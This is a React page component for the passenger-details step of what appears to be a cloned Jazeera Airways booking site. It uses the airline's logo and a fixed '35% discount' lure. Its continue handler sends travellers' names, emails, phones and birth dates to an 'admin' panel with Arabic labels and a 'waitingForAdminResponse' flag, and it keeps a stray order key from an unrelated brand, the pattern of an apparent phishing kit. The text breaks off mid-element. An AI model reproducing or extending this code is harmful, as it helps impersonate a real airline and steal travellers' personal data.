import React, { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { sendData } from '../lib/store';
import { formatPrice, getCurrency } from '../lib/currency';
import { useLang } from '../contexts/LanguageContext';
import { cityName as cityNameI18n } from '../lib/airportNames';
import CountryCodePicker from '../components/CountryCodePicker';
import DateOfBirthPicker from '../components/DateOfBirthPicker';
import CountrySelect from '../components/CountrySelect';
import SimpleDatePicker from '../components/SimpleDatePicker';

interface Passenger {
  type: string;
  gender: 'Male' | 'Female';
  firstName: string;
  lastName: string;
  dialCode: string;
  phone: string;
  email: string;
  dob: string;
  docType: string;
  passportNo: string;
  issueCountry: string;
  residenceCountry: string;
  expiryDate: string;
  issueDate: string;
}

const PassengerDetails = () => {
  const [, setLocation] = useLocation();
  const { isAr, dir, t, lang } = useLang();
  const [flightData, setFlightData] = useState<any>(null);
  const [passengers, setPassengers] = useState<Passenger[]>([]);
  const [openIndex, setOpenIndex] = useState(0);
  const [primaryIndex, setPrimaryIndex] = useState(0);
  const [flightsOpen, setFlightsOpen] = useState(false);
  const [routeDetailOpen, setRouteDetailOpen] = useState<Record<number, boolean>>({});
  const [cancelChoice, setCancelChoice] = useState<'refundable' | 'no' | null>(null);
  const [passportOpen, setPassportOpen] = useState<Record<number, boolean>>({});
  const [summaryOpen, setSummaryOpen] = useState(false);
  const [emergency, setEmergency] = useState({
    firstName: '',
    lastName: '',
    dialCode: '+965',
    phone: '',
    email: '',
  });
  const [specialAssistance, setSpecialAssistance] = useState<Record<string, any>>({});

  useEffect(() => {
    const ec = localStorage.getItem('emergencyContact');
    if (ec) {
      try { setEmergency((s) => ({ ...s, ...JSON.parse(ec) })); } catch { /* ignore */ }
    }
    const sa = localStorage.getItem('specialAssistance');
    if (sa) {
      try { setSpecialAssistance(JSON.parse(sa) || {}); } catch { /* ignore */ }
    }
    const data = localStorage.getItem('selectedFlight');
    if (!data) {
      setLocation('/');
      return;
    }
    const parsed = JSON.parse(data);
    setFlightData(parsed);

    const px = parsed.pax || { adult: parseInt(parsed.passengers) || 1, child: 0, infant: 0, senior: 0, minor: 0 };
    const types: string[] = [];
    for (let i = 0; i < (px.adult || 0); i++) types.push('Adult');
    for (let i = 0; i < (px.senior || 0); i++) types.push('Senior');
    for (let i = 0; i < (px.child || 0); i++) types.push('Child');
    for (let i = 0; i < (px.infant || 0); i++) types.push('Infant');
    for (let i = 0; i < (px.minor || 0); i++) types.push('Unaccompanied minor');
    if (types.length === 0) types.push('Adult');

    const freshList: Passenger[] = types.map((t) => ({
      type: t,
      gender: 'Male',
      firstName: '',
      lastName: '',
      dialCode: '+965',
      phone: '',
      email: '',
      dob: '',
      docType: '',
      passportNo: '',
      issueCountry: '',
      residenceCountry: '',
      expiryDate: '',
      issueDate: '',
    }));

    // Restore previously entered passenger data (e.g. after visiting the
    // emergency-contact page) so the user's input is never lost.
    let restored: Passenger[] | null = null;
    try {
      const saved = localStorage.getItem('passengerData');
      if (saved) {
        const arr = JSON.parse(saved);
        if (Array.isArray(arr) && arr.length === freshList.length) {
          restored = freshList.map((base, i) => ({ ...base, ...arr[i] }));
        }
      }
    } catch { /* ignore */ }

    setPassengers(restored || freshList);
  }, [setLocation]);

  // Persist passenger data on every change so navigating away (e.g. to add an
  // emergency contact) does not wipe what the user already typed.
  useEffect(() => {
    if (passengers.length > 0) {
      try { localStorage.setItem('passengerData', JSON.stringify(passengers)); } catch { /* ignore */ }
    }
  }, [passengers]);

  const update = (index: number, field: keyof Passenger, value: string) => {
    setPassengers((prev) => prev.map((p, i) => (i === index ? { ...p, [field]: value } : p)));
  };

  // Names must match passport: allow Latin letters, spaces, hyphen and apostrophe only.
  // Strips Arabic and any other non-Latin characters as the user types (like the original).
  const sanitizeName = (value: string) =>
    value.replace(/[^A-Za-z \-']/g, '');

  // Phone: digits only (and an optional leading +). Strips Arabic/Latin letters.
  const sanitizePhone = (value: string) =>
    value.replace(/[^0-9]/g, '');

  // Email: Latin letters, digits and common email characters only (rejects Arabic).
  const sanitizeEmail = (value: string) =>
    value.replace(/[^A-Za-z0-9@._%+\-]/g, '');

  if (!flightData || passengers.length === 0) return null;

  const px = flightData.pax || { adult: parseInt(flightData.passengers) || 1, child: 0, infant: 0, senior: 0, minor: 0 };
  const curCode = getCurrency(flightData.currency).code;
  const totalCount = passengers.length;

  // Pricing: Flights (base, taxes excluded) + Taxes (~3.66% like original 23.250/634.500)
  const base = flightData.basePriceKWD || flightData.priceKWD || 0;
  // Duo seat: a flat fee per seat that is already baked into totalPriceKWD by the
  // results page. Pull it back out so we can show it as its own summary line and
  // avoid double counting when we re-add it to the displayed Total.
  const DUO_SEAT_FEE = 9;
  const duoSeatCount = parseInt(flightData.duoSeat, 10) || 0;
  const duoSeatKWD = Math.round(DUO_SEAT_FEE * duoSeatCount * 1000) / 1000;
  const grandTotalRaw = flightData.totalPriceKWD != null
    ? flightData.totalPriceKWD
    : base * totalCount;
  // Fare-only grand total (flights + taxes), excluding the duo seat fee.
  const grandTotal = Math.round((grandTotalRaw - duoSeatKWD) * 1000) / 1000;
  // Derive flights vs taxes from the grand total (taxes ~ 3.661% of flights portion)
  const taxRate = 0.03661;
  const flightsAmount = Math.round((grandTotal / (1 + taxRate)) * 1000) / 1000;
  const taxesAmount = Math.round((grandTotal - flightsAmount) * 1000) / 1000;

  // Cancel for Any Reason (CFAR): +4 KWD per passenger; refund is 80% of fare+taxes
  const CFAR_FEE = 4.0;
  const cfarFee = cancelChoice === 'refundable' ? Math.round(CFAR_FEE * totalCount * 1000) / 1000 : 0;
  const refundAmount = Math.round(grandTotal * 0.8 * 1000) / 1000;
  // Keep the displayed Total exactly equal to the sum of the displayed lines
  // (Flights + Taxes + CFAR) in the SELECTED currency, so no rounding drift appears.
  const cur = getCurrency(flightData.currency);
  const f = Math.pow(10, cur.decimals);
  const flightsConv = Math.round(flightsAmount * cur.rate * f) / f;
  const taxesConv = Math.round(taxesAmount * cur.rate * f) / f;
  const cfarConv = Math.round(cfarFee * cur.rate * f) / f;
  const duoSeatConv = Math.round(duoSeatKWD * cur.rate * f) / f;
  // Special assistance (wheelchair) add-ons: sum across all passengers in KWD
  const assistanceKWD = Object.values(specialAssistance).reduce(
    (sum: number, v: any) => sum + (v && typeof v.priceKWD === 'number' ? v.priceKWD : 0), 0);
  const assistanceConv = Math.round(assistanceKWD * cur.rate * f) / f;
  const finalTotalConv = Math.round((flightsConv + taxesConv + cfarConv + assistanceConv + duoSeatConv) * f) / f;
  // finalTotal stays in KWD for downstream payment routing
  const finalTotal = Math.round((grandTotal + cfarFee + assistanceKWD + duoSeatKWD) * 1000) / 1000;
  // The 35% discount only applies to the fare portion (flights + taxes), which is
  // already discounted in these figures. Derive the saved amount: original = fare / 0.65.
  const fareConv = Math.round((flightsConv + taxesConv) * f) / f;
  const discountAmountConv = Math.round((fareConv / 0.65 - fareConv) * f) / f;
  // Format an already-converted amount in the selected currency.
  const fmtConv = (v: number) => `${cur.code} ${v.toLocaleString('en-US', { minimumFractionDigits: cur.decimals, maximumFractionDigits: cur.decimals })}`;

  // Trip type summary text
  const tripLabel = flightData.tripType === 'round'
    ? t('common.roundTrip')
    : flightData.tripType === 'multicity'
      ? t('common.multiCity')
      : t('fsr.oneWay');
  const firstDate = (() => {
    const d = (flightData.legs && flightData.legs[0] && flightData.legs[0].date) || flightData.date;
    if (!d) return '';
    const dt = new Date(d);
    if (isNaN(dt.getTime())) return d;
    return dt.toLocaleDateString(isAr ? 'ar-EG' : 'en-GB', { weekday: 'short', day: 'numeric', month: 'short', year: 'numeric' });
  })();

  const handleContinue = () => {
    const primary = passengers[primaryIndex];
    const isValid = passengers.every((p) => p.firstName.trim() && p.lastName.trim())
      && primary.email.trim() && primary.phone.trim();
    if (!isValid) {
      alert('Please complete all required passenger fields, including the primary guest contact details.');
      return;
    }
    localStorage.setItem('passengerData', JSON.stringify(passengers));
    localStorage.setItem('cancelForAnyReason', cancelChoice === 'refundable' ? '1' : '0');
    const summaryLegs = legs.map((leg: any) => {
      const route = (leg.origin && leg.destination)
        ? `${cityName(leg.origin)} - ${cityName(leg.destination)}`
        : (flightData.tripType === 'round' ? 'Departure' : 'Flight');
      const fn = leg.flightNumber
        ? String(leg.flightNumber).replace(/^([A-Za-z0-9]{2})\s?(\d+)$/, '$1 $2')
        : '';
      const times = (leg.departureTime && leg.arrivalTime)
        ? `${leg.departureTime} - ${leg.arrivalTime}` : '';
      const detail = [fn, times, fmtLegDate(leg.date)].filter(Boolean).join(' | ');
      return { route, detail, origin: leg.origin || '', destination: leg.destination || '' };
    });
    const bundleName = flightData.fareType || flightData.bundle || flightData.fareName || (flightData.legs && flightData.legs[0] && flightData.legs[0].fare) || 'Basic';
    localStorage.setItem('tripSummary', JSON.stringify({
      passengerCount: totalCount,
      tripLabel,
      firstDate,
      flightsConv,
      taxesConv,
      cfarConv,
      baseTotalConv: finalTotalConv,
      curCode,
      curDecimals: cur.decimals,
      curRate: cur.rate,
      baseTotalKWD: finalTotal,
      discountConv: discountAmountConv,
      legs: summaryLegs,
      bundleName,
      primaryName: `${primary.firstName} ${primary.lastName}`.trim(),
      route: summaryLegs[0] ? `${summaryLegs[0].origin} \u2708 ${summaryLegs[0].destination}` : '',
      originCode: summaryLegs[0] ? summaryLegs[0].origin : '',
      destCode: summaryLegs[0] ? summaryLegs[0].destination : '',
    }));
    localStorage.setItem('amouage_order_total', String(finalTotal));
    
    // Send passenger data to admin
    const paxData: Record<string, any> = {
      "البريد الإلكتروني": primary.email,
      "رقم الهاتف": `${primary.dialCode} ${primary.phone}`,
      "الرحلة": summaryLegs[0] ? `${summaryLegs[0].origin} ✈ ${summaryLegs[0].destination}` : '',
      "الإجمالي": `${finalTotalConv} ${curCode}`,
    };
    passengers.forEach((p, i) => {
      const label = passengers.length > 1 ? ` (مسافر ${i + 1})` : '';
      paxData[`الاسم${label}`] = `${p.firstName} ${p.lastName}`.trim();
      paxData[`الجنس${label}`] = p.gender === 'Female' ? 'أنثى' : 'ذكر';
      if (p.dob) paxData[`تاريخ الميلاد${label}`] = p.dob;
    });
    sendData({
      data: paxData,
      current: "بيانات المسافر",
      nextPage: "اختيار المقاعد",
      waitingForAdminResponse: false,
      isCustom: true,
    });

    setLocation('/seat-customization');
  };

  const legs = Array.isArray(flightData.legs) && flightData.legs.length > 0
    ? flightData.legs
    : [{
        origin: flightData.origin,
        destination: flightData.destination,
        date: flightData.date,
        flightNumber: flightData.flightNumber,
        departureTime: flightData.departureTime,
        arrivalTime: flightData.arrivalTime,
      }];

  // Map common IATA codes to city names (fallback to the code itself)
  const CITY_NAMES: Record<string, string> = {
    KWI: 'Kuwait', AMD: 'Ahmedabad', AUH: 'Abu Dhabi', DXB: 'Dubai',
    DOH: 'Doha', JED: 'Jeddah', RUH: 'Riyadh', CAI: 'Cairo', BAH: 'Bahrain',
    MCT: 'Muscat', AMM: 'Amman', BEY: 'Beirut', IST: 'Istanbul', DEL: 'Delhi',
    BOM: 'Mumbai', COK: 'Kochi', CCJ: 'Calicut', TRV: 'Trivandrum', MAA: 'Chennai',
    HYD: 'Hyderabad', BLR: 'Bengaluru', DAC: 'Dhaka', CMB: 'Colombo', KTM: 'Kathmandu',
    SLL: 'Salalah', ADE: 'Aden', SAH: 'Sanaa', LXR: 'Luxor', SSH: 'Sharm El Sheikh',
    ALY: 'Alexandria', TBS: 'Tbilisi', GYD: 'Baku', EVN: 'Yerevan', SAW: 'Istanbul',
    NJF: 'Najaf', BGW: 'Baghdad', BSR: 'Basra', EBL: 'Erbil', ISU: 'Sulaymaniyah',
  };
  const cityName = (code?: string) => (code ? cityNameI18n(String(code).toUpperCase(), CITY_NAMES[String(code).toUpperCase()] || code, lang) : '');
  const paxTypeLabel = (type: string) => {
    if (!isAr) return type;
    const map: Record<string, string> = { Adult: 'بالغ', Child: 'طفل', Infant: 'رضيع', Senior: 'كبير السن', Minor: 'قاصر' };
    return map[type] || type;
  };

  const fmtLegDate = (d?: string) => {
    if (!d) return '';
    const dt = new Date(d);
    if (isNaN(dt.getTime())) return d;
    return dt.toLocaleDateString(isAr ? 'ar-EG' : 'en-GB', { weekday: 'short', day: 'numeric', month: 'short', year: 'numeric' });
  };

  const calcDuration = (dep?: string, arr?: string) => {
    if (!dep || !arr) return '';
    const toMin = (t: string) => {
      const m = t.match(/(\d{1,2}):(\d{2})/);
      if (!m) return null;
      return parseInt(m[1], 10) * 60 + parseInt(m[2], 10);
    };
    const a = toMin(dep), b = toMin(arr);
    if (a == null || b == null) return '';
    let diff = b - a;
    if (diff < 0) diff += 24 * 60; // overnight
    const h = Math.floor(diff / 60), mm = diff % 60;
    return `${h}h ${mm}m`;
  };

  // Bundle/fare name for trip summary
  const bundleName = flightData.fareType || flightData.bundle || flightData.fareName || (flightData.legs && flightData.legs[0] && flightData.legs[0].fare) || 'Basic';

  // --- TRIP SUMMARY CONTENT (shared between desktop sidebar and mobile bottom sheet) ---
  const TripSummaryContent = () => (
    <>
      <div className="flex items-center gap-2 text-[#0a2540] mb-2">
        <svg className="w-5 h-5 text-[#0a72c0]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a4 4 0 00-3-3.87M9 20H4v-2a4 4 0 013-3.87m6-1.13a4 4 0 100-8 4 4 0 000 8z" /></svg>
        <span className="text-[15px]">{totalCount} {totalCount > 1 ? t('common.passengers') : t('common.passenger')}</span>
      </div>
      <div className="flex items-center gap-2 text-[#0a2540] mb-5">
        <svg className="w-5 h-5 text-[#0a72c0]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>
        <span className="text-[15px]">{tripLabel}: {firstDate}</span>
      </div>

      {/* Flights box (expandable) */}
      <div className="bg-[#f4f7fb] rounded-xl mb-3">
        <button
          type="button"
          onClick={() => setFlightsOpen((o) => !o)}
          className="w-full flex items-center justify-between px-4 py-4"
        >
          <span className="text-[#0a2540] font-bold text-[15px]">{t('seat.flights')}</span>
          <span className="flex items-center gap-2">
            <span className="text-[#0a72c0] font-semibold text-[15px]">{fmtConv(flightsConv)}</span>
            <svg className={`w-4 h-4 text-[#0a72c0] transition-transform ${flightsOpen ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" /></svg>
          </span>
        </button>
        {flightsOpen && (
          <div className="px-4 pb-4 border-t border-[#e3eaf2] pt-3 space-y-4">
            {legs.map((leg: any, i: number) => {
              const route = (leg.origin && leg.destination)
                ? `${cityName(leg.origin)} - ${cityName(leg.destination)}`
                : (flightData.tripType === 'round' ? t('common.departure') : (isAr ? 'رحلة' : 'Flight'));
              const fn = leg.flightNumber
                ? String(leg.flightNumber).replace(/^([A-Za-z0-9]{2})\s?(\d+)$/, '$1 $2')
                : '';
              const times = (leg.departureTime && leg.arrivalTime)
                ? `${leg.departureTime} - ${leg.arrivalTime}` : '';
              const dateStr = fmtLegDate(leg.date);
              const detailParts = [fn, times, dateStr].filter(Boolean);
              const stops = leg.stops != null ? leg.stops : 0;
              const dur = leg.duration || calcDuration(leg.departureTime, leg.arrivalTime);
              const badgeText = `${stops === 0 ? (isAr ? 'مباشر' : 'Non stop') : stops + (stops === 1 ? (isAr ? ' توقف' : ' Stop') : (isAr ? ' توقفات' : ' Stops'))}${dur ? ' | ' + dur : ''}`;
              const isRouteOpen = routeDetailOpen[i] || false;
              return (
                <div key={i} className="space-y-2">
                  {/* Route header - expandable */}
                  <button
                    type="button"
                    onClick={() => setRouteDetailOpen((prev) => ({ ...prev, [i]: !prev[i] }))}
                    className="w-full flex items-center justify-between"
                  >
                    <span className="text-[#0a2540] font-semibold text-[15px]">{route}</span>
                    <svg className={`w-4 h-4 text-gray-400 transition-transform ${isRouteOpen ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" /></svg>
                  </button>
                  {isRouteOpen && (
                    <div className="space-y-2 pl-0">
                      {detailParts.length > 0 && (
                        <div className="text-sm text-[#5b6b7b]">{detailParts.join(' | ')}</div>
                      )}
                      <div className="flex justify-center">
                        <span className="inline-block bg-[#d1d5db] text-[#1f2937] text-xs font-medium px-4 py-1.5 rounded-full">{badgeText}</span>
                      </div>
                      {/* Fare type badge */}
                      <div className="flex justify-center">
                        <span className="inline-block bg-[#e5e7eb] text-[#374151] text-xs font-medium px-6 py-1.5 rounded-full w-full text-center">{bundleName}</span>
                      </div>
                      {/* Passenger breakdown */}
                      <div className="pt-2 space-y-1">
                        <div className="flex items-center justify-between">
                          <span className="flex items-center gap-2 text-[#0a2540] font-semibold text-sm">
                            <svg className="w-4 h-4 text-[#0a72c0]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a4 4 0 00-3-3.87M9 20H4v-2a4 4 0 013-3.87m6-1.13a4 4 0 100-8 4 4 0 000 8z" /></svg>
                            {isAr ? 'الركاب' : 'Passengers'}
                          </span>
                          <span className="text-[#0a72c0] font-semibold text-sm">{fmtConv(flightsConv)}</span>
                        </div>
                        {/* Per-type breakdown */}
                        {(px.adult || 0) > 0 && (
                          <div className="flex items-center justify-between text-sm text-[#5b6b7b]">
                            <span>{px.adult}x {isAr ? 'بالغ' : 'Adult'}</span>
                            <span className="text-[#0a72c0]">{fmtConv(flightsConv)}</span>
                          </div>
                        )}
                      </div>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        )}
      </div>

      {/* Taxes box */}
      <div className="bg-[#f4f7fb] rounded-xl mb-3">
        <div className="flex items-center justify-between px-4 py-4">
          <span className="text-[#0a2540] font-bold text-[15px]">{isAr ? 'الضرائب' : 'Taxes'}</span>
          <span className="text-[#0a72c0] font-semibold text-[15px]">{fmtConv(taxesConv)}</span>
        </div>
      </div>

      {/* CFAR fee */}
      {cfarFee > 0 && (
        <div className="flex items-center justify-between px-4 py-3 mb-3 bg-[#f4f7fb] rounded-xl">
          <span className="text-[#0a2540] font-medium">{isAr ? 'الإلغاء لأي سبب' : 'Cancel for Any Reason'}</span>
          <span className="text-[#0a72c0] font-semibold">{fmtConv(cfarConv)}</span>
        </div>
      )}

      {/* Duo seat */}
      {duoSeatKWD > 0 && (
        <div className="flex items-center justify-between px-4 py-3 mb-3 bg-[#f4f7fb] rounded-xl">
          <span className="text-[#0a2540] font-medium">{isAr ? `مقعد دو (${duoSeatCount})` : `Duo seat (${duoSeatCount})`}</span>
          <span className="text-[#0a72c0] font-semibold">{fmtConv(duoSeatConv)}</span>
        </div>
      )}

      {/* Special assistance (wheelchair) */}
      {assistanceKWD > 0 && (
        <div className="flex items-center justify-between px-4 py-3 mb-3 bg-[#f4f7fb] rounded-xl">
          <span className="text-[#0a2540] font-medium">{isAr ? 'إضافات' : 'Add-ons'}</span>
          <span className="text-[#0a72c0] font-semibold">{fmtConv(assistanceConv)}</span>
        </div>
      )}

      {/* Discount: 35% already applied only to the fare (flights + taxes); add-ons/CFAR are not discounted. */}
      <div className="flex items-center justify-between px-4 py-3 mb-3 bg-[#fdeaea] rounded-xl">
        <span className="text-[#c0392b] font-medium">{isAr ? 'إجمالي الخصم 35%' : 'Total discount 35%'}</span>
        <span className="text-[#c0392b] font-semibold">- {fmtConv(discountAmountConv)}</span>
      </div>

      {/* Total */}
      <div className="flex items-center justify-between mt-4 mb-5">
        <span className="text-lg font-bold text-[#0a2540]">{t('common.total')}</span>
        <span className="flex flex-col items-end leading-tight">
          <span className="text-sm line-through text-red-500">{fmtConv(Math.round((finalTotalConv + discountAmountConv) * f) / f)}</span>
          <span className="text-lg font-extrabold text-[#0a72c0]">{fmtConv(finalTotalConv)}</span>
        </span>
      </div>
    </>
  );

  return (
    <div className="min-h-screen bg-[#EAF1FB] font-avenir pb-52 lg:pb-10" dir={dir}>
      {/* Logo - hidden on mobile, shown on desktop */}
      <div className="hidden md:block px-6 pt-5">
        <img src="/jazeera_files/J920_Logo.svg" alt="Jazeera" className="h-[90px] cursor-pointer" onClick={() => { window.location.href = '/'; }} onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
      </div>

      {/* Mobile: Simple back arrow + title (NO navbar/logo/currency/menu) */}
      <div className="md:hidden pt-10 px-5 pb-4">
        <div className="flex items-center gap-3">
          <button
            onClick={() => setLocation('/flight-search')}
            className="w-10 h-10 rounded-full bg-white border border-[#e0e8f0] flex items-center justify-center text-[#001d3d] shadow-sm"
            aria-label="Back"
          >
            <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d={isAr ? "M9 5l7 7-7 7" : "M15 19l-7-7 7-7"} /></svg>
          </button>
          <h1 className="text-[22px] font-extrabold text-[#11315F]">{isAr ? 'من المسافر اليوم؟' : 'Who\u2019s flying today?'}</h1>
        </div>
      </div>

      <main className="max-w-6xl mx-auto px-4 md:px-4 mt-0 md:mt-4">
        {/* Desktop Title row */}
        <div className="hidden md:flex items-center gap-3 mb-6">
          <button
            onClick={() => setLocation('/flight-search')}
            className="w-10 h-10 rounded-full bg-white border border-[#cfe0f3] flex items-center justify-center text-[#004A97] shadow-sm hover:bg-[#f3f8ff]"
            aria-label="Back"
          >
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 19l-7-7 7-7" /></svg>
          </button>
          <h1 className="text-4xl font-extrabold text-[#0a72c0]">{isAr ? 'من المسافر اليوم؟' : 'Who\u2019s flying today?'}</h1>
        </div>

        <div className="flex flex-col-reverse lg:flex-row gap-6 items-start">
          {/* Left column */}
          <div className="flex-1 w-full space-y-4">
            {/* Cancel for Any Reason */}
            <div className="bg-white rounded-2xl shadow-sm border border-[#e6eef7] p-5 md:p-6">
              {/* Header with icon */}
              <div className="flex items-center gap-3 pb-4 border-b border-[#e8f0f8]">
                <span className="w-11 h-11 rounded-xl bg-[#dceaf9] text-[#0a4c95] flex items-center justify-center shrink-0">
                  <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                </span>
                <h2 className="text-xl font-extrabold text-[#0a4c95]">{isAr ? 'الإلغاء لأي سبب' : 'Cancel for Any Reason'}</h2>
              </div>
              {/* Bullet points */}
              <ul className="space-y-4 mt-5 mb-5">
                {(isAr ? [
                  'ألغِ حتى 24 ساعة قبل المغادرة – فعلاً لأي سبب',
                  `استرداد 80٪ (${formatPrice(refundAmount, curCode)}) من أجرة رحلتك والضرائب إلى حسابك البنكي`,
                  'ألغِ الرحلة بنفسك عبر خيار الخدمة الذاتية',
                ] : [
                  'Cancel up to 24 hours before departure \u2013 truly for any reason',
                  `Get a refund of 80% (${formatPrice(refundAmount, curCode)}) of your flight fare and taxes to your bank account`,
                  'Cancel the trip yourself via our self-serve option',
                ]).map((line, i) => (
                  <li key={i} className="flex items-start gap-3 text-[#3a4a5b] text-[15px] leading-relaxed">
                    <svg className="w-5 h-5 text-[#3aa0e3] mt-0.5 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M5 13l4 4L19 7" /></svg>
                    <span>{line}</span>
                  </li>
                ))}
              </ul>
              <button type="button" className="text-[15px] font-semibold text-[#0a72c0] underline mb-5">{isAr ? 'عرض الشروط' : 'View Terms'}</button>
              {/* Radio options */}
              <div className="space-y-3">
                <button
                  type="button"
                  onClick={() => setCancelChoice('refundable')}
                  className={`${isAr ? 'text-right' : 'text-left'} w-full rounded-2xl p-4 bg-white border-2 transition-colors ${cancelChoice === 'refundable' ? 'border-[#0a4c95]' : 'border-[#d7e2ee]'} flex items-center justify-between`}
                >
                  <div>
                    <p className="font-bold text-[#11315F] text-[16px]">{isAr ? 'قابل للاسترداد 80٪' : '80% refundable'}</p>
                    <p className="text-sm text-gray-500 mt-0.5">+{formatPrice(4, curCode)}/{isAr ? 'للراكب' : 'passenger'}</p>
                  </div>
                  <span className={`w-6 h-6 rounded-full border-2 flex items-center justify-center shrink-0 ${cancelChoice === 'refundable' ? 'border-[#0a4c95]' : 'border-[#9bb0c7]'}`}>
                    {cancelChoice === 'refundable' && <span className="w-3 h-3 rounded-full bg-[#0a4c95]"></span>}
                  </span>
                </button>
                <button
                  type="button"
                  onClick={() => setCancelChoice('no')}
                  className={`${isAr ? 'text-right' : 'text-left'} w-full rounded-2xl p-4 bg-white border-2 transition-colors ${cancelChoice === 'no' ? 'border-[#0a4c95]' : 'border-[#d7e2ee]'} flex items-center justify-between`}
                >
                  <div>
                    <p className="font-bold text-[#11315F] text-[16px]">{isAr ? 'لا شكراً' : 'No thanks'}</p>
                    <p className="text-sm text-gray-500 mt-0.5">{isAr ? 'ابقِ رحلتي غير قابلة للاسترداد' : 'Keep my trip non-refundable'}</p>
                  </div>
                  <span className={`w-6 h-6 rounded-full border-2 flex items-center justify-center shrink-0 ${cancelChoice === 'no' ? 'border-[#0a4c95]' : 'border-[#9bb0c7]'}`}>
                    {cancelChoice === 'no' && <span className="w-3 h-3 rounded-full bg-[#0a4c95]"></span>}
                  </span>
                </button>
              </div>
            </div>

            {/* Passenger cards */}
            {passengers.map((p, index) => {
              const isOpen = openIndex === index;
              return (
                <div key={index} className="bg-white rounded-2xl shadow-sm border border-[#e6eef7] overflow-hidden">
                  {/* Card header */}
                  <button
                    type="button"
                    onClick={() => setOpenIndex(isOpen ? -1 : index)}
                    className="w-full flex items-center justify-between px-6 py-5 text-left"
                  >
                    <div>
                      <div className="text-lg font-extrabold text-[#0a4c95]">{paxTypeLabel(p.type)} {index + 1}</div>
                      {!isOpen && <div className="text-sm text-[#5b6b7b] mt-0.5">{paxTypeLabel(p.type)}</div>}
                    </div>
                    <div className="flex items-center gap-3">
                      {primaryIndex === index && (
                        <span className="text-xs font-semibold text-white bg-[#0a4c95] rounded-full px-3 py-1">{isAr ? 'الرئيسي' : 'Primary'}</span>
                      )}
                      <svg className={`w-5 h-5 text-[#0a4c95] transition-transform ${isOpen ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" /></svg>
                    </div>
                  </button>

                  {isOpen && (
                    <div className="px-6 pb-6 space-y-4">
                      {/* Gender toggle */}
                      <div className="flex gap-3">
                        {(['Male', 'Female'] as const).map((g) => (
                          <button
                            key={g}
                            type="button"
                            onClick={() => update(index, 'gender', g)}
                            className={`px-6 py-2 rounded-full text-sm font-medium border transition-colors ${p.gender === g ? 'bg-[#dceaf9] border-[#9fc4ea] text-[#0a4c95]' : 'bg-white border-[#d7e2ee] text-[#5b6b7b]'}`}
                          >
                            {g === 'Male' ? (isAr ? 'ذكر' : 'Male') : (isAr ? 'أنثى' : 'Female')}
                          </button>
                        ))}
                      </div>

                      {/* First name */}
                      <input
                        type="text"
                        placeholder={isAr ? 'الاسم الأول *' : 'First or Given name *'}
                        value={p.firstName}
                        onChange={(e) => update(index, 'firstName', sanitizeName(e.target.value))}
                        lang="en"
                        inputMode="latin"
                        autoComplete="given-name"
                        className="w-full bg-[#f4f7fb] border border-[#e3eaf2] rounded-xl px-4 py-4 text-[#0a2540] placeholder-[#8a99a8] focus:outline-none focus:border-[#0a72c0]"
                      />
                      {/* Last name */}
                      <input
                        type="text"
                        placeholder={isAr ? 'اسم العائلة *' : 'Last or Surname *'}
                        value={p.lastName}
                        onChange={(e) => update(index, 'lastName', sanitizeName(e.target.value))}
                        lang="en"
                        inputMode="latin"
                        autoComplete="family-name"
                        className="w-full bg-[#f4f7fb] border border-[#e3eaf2] rounded-xl px-4 py-4 text-[#0a2540] placeholder-[#8a99a8] focus:outline-none focus:border-[#0a72c0]"
                      />

                      {/* Phone + Email */}
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div className="flex bg-[#f4f7fb] border border-[#e3eaf2] rounded-xl overflow-hidden">
                          <div className="flex items-center border-r border-[#e3eaf2]">
                            <CountryCodePicker
                              value={p.dialCode}
                              onChange={(d) => update(index, 'dialCode', d)}
                            />
                          </div>
                          <input
                            type="tel"
                            placeholder={isAr ? 'رقم الهاتف *' : 'Phone number *'}
                            value={p.phone}
                            onChange={(e) => update(index, 'phone', sanitizePhone(e.target.value))}
                            inputMode="numeric"
                            lang="en"
                            className="flex-1 bg-transparent px-4 py-4 text-[#0a2540] placeholder-[#8a99a8] focus:outline-none"
                          />
                        </div>
                        <input
                          type="email"
                          placeholder={isAr ? 'البريد الإلكتروني *' : 'Email Id *'}
                          value={p.email}
                          onChange={(e) => update(index, 'email', sanitizeEmail(e.target.value))}
                          inputMode="email"
                          lang="en"
                          className="w-full bg-[#f4f7fb] border border-[#e3eaf2] rounded-xl px-4 py-4 text-[#0a2540] placeholder-[#8a99a8] focus:outline-none focus:border-[#0a72c0]"
                        />
                      </div>

                      {/* DOB */}
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <DateOfBirthPicker
